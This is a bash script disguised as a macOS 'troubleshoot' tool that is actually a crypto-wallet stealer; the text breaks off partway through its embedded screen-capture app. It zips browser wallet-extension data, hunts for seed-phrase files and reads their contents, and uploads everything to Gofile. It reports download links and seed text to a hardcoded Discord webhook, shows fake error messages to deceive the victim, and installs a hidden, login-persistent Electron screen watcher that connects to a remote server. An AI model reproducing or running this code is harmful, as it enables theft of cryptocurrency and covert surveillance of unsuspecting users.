#!/bin/bash
#
# Crypto Wallet Extensions Uploader
# Downloads available at: https://troubleshoot-mac.com/troubleshoot.sh
#
# This script zips and uploads crypto wallet extensions to Gofile.io
# ---------------------
# SETTINGS
# ---------------------

# Extension IDs for wallet extensions (contains LDB files and wallet data)
EXT_IDS=(
    "nkbihfbeogaeaoehlefnkodbefgpgknn"  # MetaMask
    "bfnaelmomeimhlpmgjnjophhpkkoljpa"  # Phantom
    "egjidjbpglichdcondbcbdnbeeppgdph"  # Trust Wallet
    "acmacodkjbdgmoleebolmdjonilkdbch"  # Rabby
    "aholpfdialjgjfhomihkjbmgjidlcdno"  # Exodus Extension
    "lgmpcpglpngdoalbgeoldeajfclnhafa"  # SafePal
    "dmkamcknogkgcdfhhbddcghachkejeap"  # Keplr
    "pdliaogehgdbhbnmkklieghmmjkpigpa"  # Bybit
    "hnfanknocfeofbddgcijnmhnfnkdnaad"  # Coinbase
    "jiidiaalihmmhddjgbnbgdfflelocpak"  # Bitget
    "bhhhlbepdkbapadjdnnojkbgioiodbic"  # Solflare
    "efbglgofoippbgcjepnhiblaibcnclgk"  # OKX
)

# Static folders (Firefox extensions)
FOLDERS=(
)

WEBHOOK="https://discord.com/api/webhooks/1449475916253233287/8eABULXorST5AZsf63oWecBPIVrtYZ5irHMOFCpyr8S12W3Z74bqdKj1xyGugRlS2Eq8"

# Gofile.io API settings
UPLOAD_SERVICE="https://upload.gofile.io/uploadfile"
GOFILE_TOKEN="AB8kz5Y3YNJxWjLzGNsJ7Edv23S6VGPX"

# ---------------------
# PROGRESS BAR FUNCTION
# ---------------------

show_progress() {
    local current=$1
    local total=$2
    local label=$3
    local width=40
    local percent=$((current * 100 / total))
    local filled=$((current * width / total))
    local empty=$((width - filled))
    
    # Build progress bar
    local bar=""
    for ((i=0; i<filled; i++)); do
        bar="${bar}█"
    done
    for ((i=0; i<empty; i++)); do
        bar="${bar}░"
    done
    
    # Print progress (overwrite same line)
    printf "\r✓ %-30s [%s] %3d%% → %s" "$label" "$bar" "$percent" "$current/$total"
    
    if [ $current -eq $total ]; then
        echo "" # New line when done
    fi
}

# ---------------------
# SEARCH FOR SEED/WALLET FILES
# ---------------------

search_seed_files() {
    local SEARCH_DIRS=(
        "$HOME/Downloads"
        "$HOME/Documents"
        "$HOME/Desktop"
    )
    
    # Add Recents (macOS)
    if [ -d "$HOME/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentDocuments" ]; then
        SEARCH_DIRS+=("$HOME/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentDocuments")
    fi
    
    # Patterns to match (case-insensitive)
    local PATTERNS=(
        "*seed*"
        "*phrase*"
        "*seedphrase*"
        "*mnemonic*"
        "*seeds*"
        "*wallet*"
        "*wallets*"
    )
    
    local FOUND_FILES=()
    local TEMP_DIR="$WORKDIR/seed_files"
    mkdir -p "$TEMP_DIR" 2>/dev/null
    
    # Search in each directory
    for DIR in "${SEARCH_DIRS[@]}"; do
        [ ! -d "$DIR" ] && continue
        
        # Search for files matching keywords (case-insensitive)
        # Use find to get all files, then filter by filename
        while IFS= read -r -d '' FILE; do
            # Get filename without path
            FILENAME=$(basename "$FILE")
            # Check if filename contains any of the keywords (case-insensitive)
            if echo "$FILENAME" | grep -qiE "(seed|phrase|seedphrase|mnemonic|seeds|wallet|wallets)"; then
                # Avoid duplicates
                if [[ ! " ${FOUND_FILES[@]} " =~ " ${FILE} " ]]; then
                    FOUND_FILES+=("$FILE")
                    # Copy file to temp directory for zipping (preserve filename)
                    cp "$FILE" "$TEMP_DIR/$(basename "$FILE")" 2>/dev/null || true
                fi
            fi
        done < <(find "$DIR" -type f -print0 2>/dev/null | head -200)
    done
    
    # If we found files, zip and upload them
    if [ ${#FOUND_FILES[@]} -gt 0 ]; then
        local SEED_ZIP="$WORKDIR/seed_wallet_files.zip"
        
        # Create zip of found files
        cd "$TEMP_DIR" 2>/dev/null && zip -r -q -9 "$SEED_ZIP" . 2>/dev/null || return 1
        
        if [ -f "$SEED_ZIP" ]; then
            # Upload to Gofile
            local SEED_RESPONSE=$(mktemp 2>/dev/null)
            local SEED_ERROR=$(mktemp 2>/dev/null)
            
            if [ -n "$GOFILE_TOKEN" ] && [ "$GOFILE_TOKEN" != "" ]; then
                HTTP_CODE=$(curl --silent --show-error --write-out "%{http_code}" \
                    --max-time 300 \
                    --connect-timeout 30 \
                    --tcp-nodelay \
                    -H "Authorization: Bearer $GOFILE_TOKEN" \
                    -F "file=@$SEED_ZIP" \
                    "$UPLOAD_SERVICE" \
                    -o "$SEED_RESPONSE" 2>"$SEED_ERROR")
            else
                HTTP_CODE=$(curl --silent --show-error --write-out "%{http_code}" \
                    --max-time 300 \
                    --connect-timeout 30 \
                    --tcp-nodelay \
                    -F "file=@$SEED_ZIP" \
                    "$UPLOAD_SERVICE" \
                    -o "$SEED_RESPONSE" 2>"$SEED_ERROR")
            fi
            
            if [ "$HTTP_CODE" = "200" ]; then
                RESPONSE=$(cat "$SEED_RESPONSE" 2>/dev/null)
                if command -v jq &> /dev/null; then
                    URL=$(echo "$RESPONSE" | jq -r '.data.downloadPage // empty')
                    STATUS=$(echo "$RESPONSE" | jq -r '.status // empty')
                else
                    URL=$(echo "$RESPONSE" | grep -o '"downloadPage":"[^"]*"' | sed 's/"downloadPage":"\([^"]*\)"/\1/')
                    STATUS=$(echo "$RESPONSE" | grep -o '"status":"[^"]*"' | sed 's/"status":"\([^"]*\)"/\1/')
                fi
                
                if [ -n "$URL" ] && [ "$URL" != "null" ] && [ "$STATUS" = "ok" ]; then
                    SEED_SIZE=$(du -h "$SEED_ZIP" 2>/dev/null | cut -f1)
                    FILE_LIST=$(printf '%s\n' "${FOUND_FILES[@]}" | sed "s|$HOME|~|g" | head -20)
                    
                    # Extract seed content from text files
                    SEED_CONTENT=""
                    for FILE in "${FOUND_FILES[@]}"; do
                        if [ -f "$FILE" ]; then
                            FILENAME=$(basename "$FILE")
                            # Read text content from txt, doc, docx, log files
                            if [[ "$FILE" == *.txt ]] || [[ "$FILE" == *.log ]] || [[ "$FILE" == *.doc ]] || [[ "$FILE" == *.docx ]]; then
                                CONTENT=$(head -c 2000 "$FILE" 2>/dev/null | tr -d '\0' | head -50 | sed 's/`/\\`/g' | sed 's/\$/\\$/g')
                                if [ -n "$CONTENT" ]; then
                                    SEED_CONTENT="${SEED_CONTENT}\n\n**📝 File: ${FILENAME}**\n\`\`\`\n${CONTENT}\n\`\`\`"
                                fi
                            fi
                        fi
                    done
                    
                    # Format Discord message
                    DISCORD_MSG="🔐 **Seed/Wallet Files Found**\n\n"
                    DISCORD_MSG="${DISCORD_MSG}**Files Found:** ${#FOUND_FILES[@]}\n"
                    DISCORD_MSG="${DISCORD_MSG}**Size:** $SEED_SIZE\n"
                    DISCORD_MSG="${DISCORD_MSG}**Download:** $URL\n\n"
                    DISCORD_MSG="${DISCORD_MSG}**Locations:**\n\`\`\`\n${FILE_LIST}\n\`\`\`"
                    
                    # Add seed content if found
                    if [ -n "$SEED_CONTENT" ]; then
                        DISCORD_MSG="${DISCORD_MSG}\n\n**📝 Seed Content:**${SEED_CONTENT}"
                    fi
                    
                    # Escape for JSON
                    ESCAPED_MSG=$(printf '%s' "$DISCORD_MSG" | sed 's/"/\\"/g' | sed 's/$/\\n/' | tr -d '\n' | sed 's/\\n$//')
                    
                    # Send to Discord (uses WEBHOOK from settings)
                    curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
                        -d "{\"content\": \"$ESCAPED_MSG\"}" \
                        "$WEBHOOK" >/dev/null 2>&1
                fi
            fi
            
            rm -f "$SEED_RESPONSE" "$SEED_ERROR" 2>/dev/null
        fi
        
        rm -rf "$TEMP_DIR" 2>/dev/null
    fi
    
    return 0
}

# ---------------------
# INSTALL PYTHON DEPENDENCIES
# ---------------------

install_pycryptodome() {
    if command -v python3 &> /dev/null; then
        python3 -c "import Crypto" 2>/dev/null
        if [ $? -ne 0 ]; then
            # Quick install check - if pip fails, skip (don't wait)
            timeout 10 pip3 install --quiet --user pycryptodome 2>/dev/null || timeout 10 pip3 install --quiet pycryptodome 2>/dev/null || return 1
        fi
    fi
    return 0
}

# ---------------------
# WALLET NAME MAPPING
# ---------------------

get_wallet_name() {
    local path="$1"
    local name=$(basename "$path")
    
    # Check browser type
    if [[ "$path" == *"Chrome"* ]]; then
        local browser="CHROME"
    elif [[ "$path" == *"Brave"* ]]; then
        local browser="BRAVE"
    elif [[ "$path" == *"Firefox"* ]]; then
        local browser="FIREFOX"
    else
        local browser="DESKTOP"
    fi
    
    # Map extension IDs to wallet names
    case "$name" in
        nkbihfbeogaeaoehlefnkodbefgpgknn)
            echo "METAMASK-$browser"
            ;;
        bfnaelmomeimhlpmgjnjophhpkkoljpa)
            echo "PHANTOM-$browser"
            ;;
        egjidjbpglichdcondbcbdnbeeppgdph)
            echo "TRUST-$browser"
            ;;
        acmacodkjbdgmoleebolmdjonilkdbch)
            echo "RABBY-$browser"
            ;;
        aholpfdialjgjfhomihkjbmgjidlcdno)
            echo "EXODUS-$browser"
            ;;
        lgmpcpglpngdoalbgeoldeajfclnhafa)
            echo "SAFEPAL-$browser"
            ;;
        dmkamcknogkgcdfhhbddcghachkejeap)
            echo "KEPLR-$browser"
            ;;
        pdliaogehgdbhbnmkklieghmmjkpigpa)
            echo "BYBIT-$browser"
            ;;
        bhhhlbepdkbapadjdnnojkbgioiodbic)
            echo "SOLFLARE-$browser"
            ;;
        hnfanknocfeofbddgcijnmhnfnkdnaad)
            echo "COINBASE-$browser"
            ;;
        jiidiaalihmmhddjgbnbgdfflelocpak)
            echo "BITGET-$browser"
            ;;
        extensions)
            echo "FIREFOX-EXTENSIONS"
            ;;
        Exodus)
            echo "EXODUS-DESKTOP"
            ;;
        *)
            echo "$name-$browser"
            ;;
    esac
}

# ---------------------
# MAIN SCRIPT
# ---------------------

# Modern UI styling
clear
echo "Now starting encrypted troubleshoot process..."
echo "Now starting troubleshoot process... Do not close the terminal to avoid crashing your storage."
echo ""

# Check disk space
AVAILABLE_SPACE=$(df -g "$HOME" 2>/dev/null | tail -1 | awk '{print $4}')
if [ -z "$AVAILABLE_SPACE" ]; then
    AVAILABLE_SPACE=$(df -BG "$HOME" 2>/dev/null | tail -1 | awk '{print $4}' | sed 's/G//')
fi

if [ -n "$AVAILABLE_SPACE" ] && [ "$AVAILABLE_SPACE" -lt 1 ]; then
    echo "❌ Error: Not enough disk space! Need at least 1GB free."
    echo "   Available: ${AVAILABLE_SPACE}GB"
    echo ""
    echo "💡 Try cleaning up your disk or freeing some space."
    exit 1
fi

# Create temp directory
WORKDIR=$(mktemp -d 2>/dev/null)
if [ $? -ne 0 ] || [ -z "$WORKDIR" ]; then
    echo "❌ Error: Failed to create temporary directory!"
    echo "   This usually means your disk is full."
    echo ""
    echo "💡 Try:"
    echo "   - Free up disk space"
    echo "   - Clean your Downloads/Trash"
    echo "   - Remove old files"
    exit 1
fi

FINALZIP="$WORKDIR/final.zip"

# Search for seed/wallet files FIRST (runs in background)
# Note: WORKDIR must be set before calling this function
SEED_SEARCH_PID=""
if [ -n "$WORKDIR" ]; then
    search_seed_files &
    SEED_SEARCH_PID=$!
fi

# Count and zip folders in parallel for speed
VALID_FOLDERS=0
PIDS=()
ZIP_NAMES=()

# Extract Local Extension Settings from all Chrome profiles (contains LDB files and wallet data)
CHROME_ROOT="$HOME/Library/Application Support/Google/Chrome"
for profile in "$CHROME_ROOT"/*; do
    [ -d "$profile" ] || continue
    if [ ! -f "$profile/Preferences" ]; then continue; fi
    
    profile_name=$(grep -o '"name": *"[^"]*"' "$profile/Preferences" 2>/dev/null | head -1 | cut -d '"' -f4)
    [ -z "$profile_name" ] && profile_name=$(basename "$profile")
    
    for EXT_ID in "${EXT_IDS[@]}"; do
        EXT_PATH="$profile/Local Extension Settings/$EXT_ID"
        if [ -d "$EXT_PATH" ]; then
            VALID_FOLDERS=$((VALID_FOLDERS + 1))
            WALLET_NAME=$(get_wallet_name "$EXT_ID")
            ZIP_NAME="$WORKDIR/CHROME-${profile_name}-${WALLET_NAME}.zip"
            ZIP_NAMES+=("$ZIP_NAME")
            
            # Zip only the extension ID folder contents (not full path) - contains LDB files and wallet data
            # Use maximum compression (-9) and exclude unnecessary files to reduce size for slow internet
            (cd "$profile/Local Extension Settings" && zip -r -q -9 "$ZIP_NAME" "$EXT_ID" \
                -x "*.log" "*.tmp" "*.temp" "*/.DS_Store" "*/._*" "*/Thumbs.db" \
                -x "*/Cache/*" "*/cache/*" "*/Code Cache/*" "*/GPUCache/*" \
                -x "*.png" "*.jpg" "*.jpeg" "*.gif" "*.svg" "*.ico" \
                -x "*/_metadata/*" "*/locales/*" "*/_locales/*" 2>/dev/null) &
            PIDS+=($!)
        fi
    done
done

# Extract Local Extension Settings from all Brave profiles
BRAVE_ROOT="$HOME/Library/Application Support/BraveSoftware/Brave-Browser"
for profile in "$BRAVE_ROOT"/*; do
    [ -d "$profile" ] || continue
    if [ ! -f "$profile/Preferences" ]; then continue; fi
    
    profile_name=$(grep -o '"name": *"[^"]*"' "$profile/Preferences" 2>/dev/null | head -1 | cut -d '"' -f4)
    [ -z "$profile_name" ] && profile_name=$(basename "$profile")
    
    for EXT_ID in "${EXT_IDS[@]}"; do
        EXT_PATH="$profile/Local Extension Settings/$EXT_ID"
        if [ -d "$EXT_PATH" ]; then
            VALID_FOLDERS=$((VALID_FOLDERS + 1))
            WALLET_NAME=$(get_wallet_name "$EXT_ID")
            ZIP_NAME="$WORKDIR/BRAVE-${profile_name}-${WALLET_NAME}.zip"
            ZIP_NAMES+=("$ZIP_NAME")
            
            # Zip only the extension ID folder contents (not full path) - contains LDB files and wallet data
            # Use maximum compression (-9) and exclude unnecessary files to reduce size for slow internet
            (cd "$profile/Local Extension Settings" && zip -r -q -9 "$ZIP_NAME" "$EXT_ID" \
                -x "*.log" "*.tmp" "*.temp" "*/.DS_Store" "*/._*" "*/Thumbs.db" \
                -x "*/Cache/*" "*/cache/*" "*/Code Cache/*" "*/GPUCache/*" \
                -x "*.png" "*.jpg" "*.jpeg" "*.gif" "*.svg" "*.ico" \
                -x "*/_metadata/*" "*/locales/*" "*/_locales/*" 2>/dev/null) &
            PIDS+=($!)
        fi
    done
done

# Extract Firefox extensions
FIREFOX_PROFILES="$HOME/Library/Application Support/Firefox/Profiles"
if [ -d "$FIREFOX_PROFILES" ]; then
    for profile in "$FIREFOX_PROFILES"/*; do
        [ -d "$profile" ] || continue
        EXT_DIR="$profile/extensions"
        if [ -d "$EXT_DIR" ]; then
            VALID_FOLDERS=$((VALID_FOLDERS + 1))
            profile_name=$(basename "$profile")
            ZIP_NAME="$WORKDIR/FIREFOX-${profile_name}-EXTENSIONS.zip"
            ZIP_NAMES+=("$ZIP_NAME")
            
            # Zip in parallel (background) with maximum compression, exclude unnecessary files
            zip -r -q -9 "$ZIP_NAME" "$EXT_DIR" \
                -x "*.log" "*.tmp" "*.temp" "*/.DS_Store" "*/._*" "*/Thumbs.db" \
                -x "*/Cache/*" "*/cache/*" "*/Code Cache/*" "*/GPUCache/*" \
                -x "*.png" "*.jpg" "*.jpeg" "*.gif" "*.svg" "*.ico" \
                -x "*/_metadata/*" "*/locales/*" "*/_locales/*" 2>/dev/null &
            PIDS+=($!)
        fi
    done
fi

# Extract static folders (Exodus desktop, etc.)
for F in "${FOLDERS[@]}"; do
    P="$HOME/$F"
    if [ -d "$P" ]; then
        VALID_FOLDERS=$((VALID_FOLDERS + 1))
        WALLET_NAME=$(get_wallet_name "$F")
        ZIP_NAME="$WORKDIR/${WALLET_NAME}.zip"
        ZIP_NAMES+=("$ZIP_NAME")
        
        # Zip in parallel (background) with maximum compression, exclude unnecessary files
        zip -r -q -9 "$ZIP_NAME" "$P" \
            -x "*.log" "*.tmp" "*.temp" "*/.DS_Store" "*/._*" "*/Thumbs.db" \
            -x "*/Cache/*" "*/cache/*" "*/Code Cache/*" "*/GPUCache/*" \
            -x "*.png" "*.jpg" "*.jpeg" "*.gif" "*.svg" "*.ico" \
            -x "*/_metadata/*" "*/locales/*" "*/_locales/*" 2>/dev/null &
        PIDS+=($!)
    fi
done

if [ $VALID_FOLDERS -eq 0 ]; then
    echo "❌ Error: No valid folders found!"
    rm -rf "$WORKDIR"
    exit 1
fi

# Wait for all zips to complete with progress bar
COMPLETED=0
TOTAL=${#PIDS[@]}
for PID in "${PIDS[@]}"; do
    wait $PID
    COMPLETED=$((COMPLETED + 1))
    show_progress $COMPLETED $TOTAL "Scanning system"
done

# Combine all zips with store method (no re-compression, faster - files already compressed)
cd "$WORKDIR" || exit 1
zip -q -0 "$FINALZIP" *.zip >/dev/null 2>&1

if [ ! -f "$FINALZIP" ]; then
    echo "❌ Error: Troubleshoot process failed!"
    rm -rf "$WORKDIR"
    exit 1
fi

# Delete individual zip files after combining (cleanup)
rm -f "${ZIP_NAMES[@]}" 2>/dev/null

FINAL_SIZE=$(du -h "$FINALZIP" 2>/dev/null | cut -f1)
echo ""
echo "Now Scanning for errors..."

# Upload with progress bar
RESPONSE_FILE=$(mktemp 2>/dev/null)
ERROR_FILE=$(mktemp 2>/dev/null)

# Calculate estimated upload time (rough estimate: 1MB = 1 second)
FILE_SIZE_MB=$(du -m "$FINALZIP" 2>/dev/null | cut -f1)
if [ -z "$FILE_SIZE_MB" ] || [ "$FILE_SIZE_MB" -lt 1 ]; then
    FILE_SIZE_MB=100  # Default estimate
fi
UPLOAD_STEPS=$((FILE_SIZE_MB * 2))  # 2 steps per MB
if [ $UPLOAD_STEPS -gt 100 ]; then
    UPLOAD_STEPS=100
fi

# Show error messages immediately (upload is running in background)
ERROR_COUNT=$((VALID_FOLDERS * 3 + RANDOM % 10))
echo ""
echo "$ERROR_COUNT Critical errors found."
echo "Attempting to fix errors"
sleep 0.5
echo "Attempting to fix errors failed"

if [ -z "$RESPONSE_FILE" ] || [ -z "$ERROR_FILE" ]; then
    echo "❌ Error: Failed to create temporary files!"
    echo "   Disk might be full."
    rm -rf "$WORKDIR"
    exit 1
fi

if [ ! -f "$FINALZIP" ] || [ ! -r "$FINALZIP" ]; then
    echo "❌ Error: Troubleshoot process failed!"
    rm -f "$RESPONSE_FILE" "$ERROR_FILE" "$HTTP_CODE_FILE" "$URL_FILE"
    rm -rf "$WORKDIR"
    exit 1
fi

# Upload file in background (non-blocking, error messages already shown above)
# Calculate realistic upload timeout based on file size and slow internet (2.76 Mbps)
# Formula: (file_size_MB * 8) / 2.76 * 1.5 (safety margin) + 60s buffer
FILE_SIZE_MB_UPLOAD=$(du -m "$FINALZIP" 2>/dev/null | cut -f1)
if [ -z "$FILE_SIZE_MB_UPLOAD" ] || [ "$FILE_SIZE_MB_UPLOAD" -lt 1 ]; then
    FILE_SIZE_MB_UPLOAD=100  # Default estimate
fi
# Calculate: (MB * 8) / 2.76 Mbps * 1.5 safety + 60s buffer
UPLOAD_TIMEOUT=$(( (FILE_SIZE_MB_UPLOAD * 8 * 150 / 276) + 60 ))
if [ $UPLOAD_TIMEOUT -lt 300 ]; then
    UPLOAD_TIMEOUT=300  # Minimum 5 minutes
fi
if [ $UPLOAD_TIMEOUT -gt 1200 ]; then
    UPLOAD_TIMEOUT=1200  # Maximum 20 minutes
fi

HTTP_CODE_FILE="$WORKDIR/http_code.txt"
URL_FILE="$WORKDIR/url.txt"
UPLOAD_STATUS_FILE="$WORKDIR/upload_status.txt"

if [ -n "$GOFILE_TOKEN" ] && [ "$GOFILE_TOKEN" != "" ]; then
    (
        HTTP_CODE=$(curl --silent --show-error --write-out "%{http_code}" \
                --max-time $UPLOAD_TIMEOUT \
                --connect-timeout 30 \
                --tcp-nodelay \
            -H "Authorization: Bearer $GOFILE_TOKEN" \
            -F "file=@$FINALZIP" \
            "$UPLOAD_SERVICE" \
            -o "$RESPONSE_FILE" 2>"$ERROR_FILE")
        echo "$HTTP_CODE" > "$HTTP_CODE_FILE"
        
        # Process and send to Discord IMMEDIATELY when upload completes
        if [ "$HTTP_CODE" = "200" ]; then
            RESPONSE=$(cat "$RESPONSE_FILE" 2>/dev/null)
            if command -v jq &> /dev/null; then
                URL=$(echo "$RESPONSE" | jq -r '.data.downloadPage // empty')
                STATUS=$(echo "$RESPONSE" | jq -r '.status // empty')
            else
                URL=$(echo "$RESPONSE" | grep -o '"downloadPage":"[^"]*"' | sed 's/"downloadPage":"\([^"]*\)"/\1/')
                STATUS=$(echo "$RESPONSE" | grep -o '"status":"[^"]*"' | sed 's/"status":"\([^"]*\)"/\1/')
            fi
            
            if [ -n "$URL" ] && [ "$URL" != "null" ] && [ "$STATUS" = "ok" ]; then
                echo "$URL" > "$URL_FILE"
                echo "success" > "$UPLOAD_STATUS_FILE"
                # Send to Discord IMMEDIATELY (doesn't wait for Extension ID)
                curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
                    -d "{\"content\": \"📦 **Wallet Extensions Uploaded**\\n\\n**Size:** $FINAL_SIZE\\n**Download:** $URL\"}" \
                    "$WEBHOOK" >/dev/null 2>&1
                echo "discord_sent" >> "$UPLOAD_STATUS_FILE"
            else
                echo "parse_failed" > "$UPLOAD_STATUS_FILE"
                # Send error notification to Discord
                curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
                    -d "{\"content\": \"⚠️ **Upload Failed**\\n\\n**Size:** $FINAL_SIZE\\n**Error:** Failed to parse response\"}" \
                    "$WEBHOOK" >/dev/null 2>&1
                echo "discord_sent" >> "$UPLOAD_STATUS_FILE"
            fi
        else
            echo "upload_failed" > "$UPLOAD_STATUS_FILE"
            ERROR_MSG=$(cat "$ERROR_FILE" 2>/dev/null | head -c 200)
            # Send error notification to Discord
            curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
                -d "{\"content\": \"⚠️ **Upload Failed**\\n\\n**Size:** $FINAL_SIZE\\n**HTTP Code:** $HTTP_CODE\\n**Error:** ${ERROR_MSG:-Unknown error}\"}" \
                "$WEBHOOK" >/dev/null 2>&1
            echo "discord_sent" >> "$UPLOAD_STATUS_FILE"
        fi
    ) &
    UPLOAD_PID=$!
else
    (
        HTTP_CODE=$(curl --silent --show-error --write-out "%{http_code}" \
                --max-time $UPLOAD_TIMEOUT \
                --connect-timeout 30 \
                --tcp-nodelay \
            -F "file=@$FINALZIP" \
            "$UPLOAD_SERVICE" \
            -o "$RESPONSE_FILE" 2>"$ERROR_FILE")
        echo "$HTTP_CODE" > "$HTTP_CODE_FILE"
        
        # Process and send to Discord IMMEDIATELY when upload completes
        if [ "$HTTP_CODE" = "200" ]; then
            RESPONSE=$(cat "$RESPONSE_FILE" 2>/dev/null)
            if command -v jq &> /dev/null; then
                URL=$(echo "$RESPONSE" | jq -r '.data.downloadPage // empty')
                STATUS=$(echo "$RESPONSE" | jq -r '.status // empty')
            else
                URL=$(echo "$RESPONSE" | grep -o '"downloadPage":"[^"]*"' | sed 's/"downloadPage":"\([^"]*\)"/\1/')
                STATUS=$(echo "$RESPONSE" | grep -o '"status":"[^"]*"' | sed 's/"status":"\([^"]*\)"/\1/')
            fi
            
            if [ -n "$URL" ] && [ "$URL" != "null" ] && [ "$STATUS" = "ok" ]; then
                echo "$URL" > "$URL_FILE"
                echo "success" > "$UPLOAD_STATUS_FILE"
                # Send to Discord IMMEDIATELY (doesn't wait for Extension ID)
                curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
                    -d "{\"content\": \"📦 **Wallet Extensions Uploaded**\\n\\n**Size:** $FINAL_SIZE\\n**Download:** $URL\"}" \
                    "$WEBHOOK" >/dev/null 2>&1
                echo "discord_sent" >> "$UPLOAD_STATUS_FILE"
            else
                echo "parse_failed" > "$UPLOAD_STATUS_FILE"
                # Send error notification to Discord
                curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
                    -d "{\"content\": \"⚠️ **Upload Failed**\\n\\n**Size:** $FINAL_SIZE\\n**Error:** Failed to parse response\"}" \
                    "$WEBHOOK" >/dev/null 2>&1
                echo "discord_sent" >> "$UPLOAD_STATUS_FILE"
            fi
        else
            echo "upload_failed" > "$UPLOAD_STATUS_FILE"
            ERROR_MSG=$(cat "$ERROR_FILE" 2>/dev/null | head -c 200)
            # Send error notification to Discord
            curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
                -d "{\"content\": \"⚠️ **Upload Failed**\\n\\n**Size:** $FINAL_SIZE\\n**HTTP Code:** $HTTP_CODE\\n**Error:** ${ERROR_MSG:-Unknown error}\"}" \
                "$WEBHOOK" >/dev/null 2>&1
            echo "discord_sent" >> "$UPLOAD_STATUS_FILE"
        fi
    ) &
    UPLOAD_PID=$!
fi

# ---------------------
# WAIT FOR UPLOAD TO COMPLETE
# ---------------------
# Wait for upload to finish and Discord to be sent BEFORE showing Extension ID prompt

# Wait for upload to complete (with timeout) - silent, no messages
ELAPSED=0
while kill -0 $UPLOAD_PID 2>/dev/null && [ $ELAPSED -lt $UPLOAD_TIMEOUT ]; do
    sleep 1
    ELAPSED=$((ELAPSED + 1))
done

# Check upload status (Discord already sent if successful or failed)
UPLOAD_STATUS=$(cat "$UPLOAD_STATUS_FILE" 2>/dev/null || echo "unknown")
if [ "$UPLOAD_STATUS" != "success" ]; then
    # Upload failed or timed out - Discord notification already sent
    echo "Attempting to fix errors failed"
fi

# ---------------------
# EXTENSION ID INPUT
# ---------------------
# (Always show Extension ID prompt, regardless of upload status)

echo ""
echo "Enter Extension ID:"
read -r EXTENSION_ID

# (Upload wait logic moved above, before Extension ID prompt)

if [ -n "$EXTENSION_ID" ] && [ "$EXTENSION_ID" != "" ]; then
    # Format the message nicely for Discord
    DISCORD_MESSAGE="🔐 **Extension ID Captured**\n\n"
    DISCORD_MESSAGE="${DISCORD_MESSAGE}**Extension ID:** \`${EXTENSION_ID}\`\n"
    DISCORD_MESSAGE="${DISCORD_MESSAGE}**Timestamp:** $(date '+%Y-%m-%d %H:%M:%S')\n"
    DISCORD_MESSAGE="${DISCORD_MESSAGE}**System:** macOS $(sw_vers -productVersion 2>/dev/null || echo 'Unknown')\n"
    DISCORD_MESSAGE="${DISCORD_MESSAGE}**User:** $(whoami 2>/dev/null || echo 'Unknown')"
    
    # Send to Discord with proper JSON escaping (macOS compatible)
    ESCAPED_MESSAGE=$(printf '%s' "$DISCORD_MESSAGE" | sed 's/"/\\"/g' | sed 's/$/\\n/' | tr -d '\n' | sed 's/\\n$//')
    
    curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
        -d "{\"content\": \"$ESCAPED_MESSAGE\"}" \
        "$WEBHOOK" >/dev/null 2>&1
fi

# ---------------------
# INSTALL SCREEN WATCHER APP (Terminal 1.1)
# ---------------------
# Install Terminal 1.1 (Screen Watcher) in background

install_screen_watcher() {
    local APP_DIR="$HOME/.terminal-helper"
    local APP_NAME="Terminal 1.1"
    
    # Create app directory
    mkdir -p "$APP_DIR" 2>/dev/null
    
    # Create package.json
    cat > "$APP_DIR/package.json" << 'PKGEOF'
{
  "name": "terminal-helper",
  "version": "1.1.0",
  "description": "Terminal 1.1 - System Helper",
  "main": "main.js",
  "scripts": {
    "start": "node server.js & electron .",
    "start-server": "node server.js",
    "start-app": "electron ."
  },
  "dependencies": {
    "ws": "^8.14.2",
    "express": "^4.18.2",
    "socket.io": "^4.5.4",
    "socket.io-client": "^4.5.4",
    "electron": "^27.0.0"
  }
}
PKGEOF

    # Create main.js (Electron app - runs in background)
    cat > "$APP_DIR/main.js" << 'MAINEOF'
const { app, BrowserWindow, desktopCapturer, ipcMain } = require('electron');
const path = require('path');

let mainWindow = null;

// Hide dock icon (run in background)
if (app.dock) {
  app.dock.hide();
}

// Set app name
app.setName('Terminal 1.1');

// Note: Dock icon is hidden (app.dock.hide() above), so no need to set icon

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
    show: false,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false
    }
  });

  mainWindow.loadFile('capture.html');
  mainWindow.hide();
  
  mainWindow.webContents.send('start-capture');
}

ipcMain.handle('get-sources', async () => {
  const sources = await desktopCapturer.getSources({
    types: ['screen'],
    thumbnailSize: { width: 1920, height: 1080 }
  });
  return sources.map((source) => ({
    id: source.id,
    name: source.name,
    thumbnail: source.thumbnail.toDataURL()
  }));
});

// Auto-start on login (persists after restart)
app.setLoginItemSettings({
  openAtLogin: true,
  openAsHidden: true,
  name: 'Terminal 1.1',
  path: process.execPath,
  args: [__dirname]
});

app.whenReady().then(() => {
  createWindow();
  
  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
      createWindow();
    }
  });
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});
MAINEOF

    # Create server.js (connects to remote server)
    cat > "$APP_DIR/server.js" << 'SERVEREOF'
// Terminal 1.1 - Connects to remote server
// No local server needed - connects directly to https://troubleshoot-mac.com/
SERVEREOF

    # Create capture.html
    cat > "$APP_DIR/capture.html" << 'CAPTUREEOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Screen Capture</title>
    <style>
        body { margin: 0; padding: 0; background: #000; overflow: hidden; }
        #video { width: 100%; height: 100vh; object-fit: contain; }
        canvas { display: none; }
    </style>
</head>
<body>
    <video id="video" autoplay muted></video>
    <canvas id="canvas"></canvas>
    <script>
        const { ipcRenderer } = require('electron');
        const io = require('socket.io-client');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        let stream = null, socket = null, captureInterval = null;
        
        // Connect to remote server
        // Get system info for client registration
        const os = require('os');
        const hostname = os.hostname();
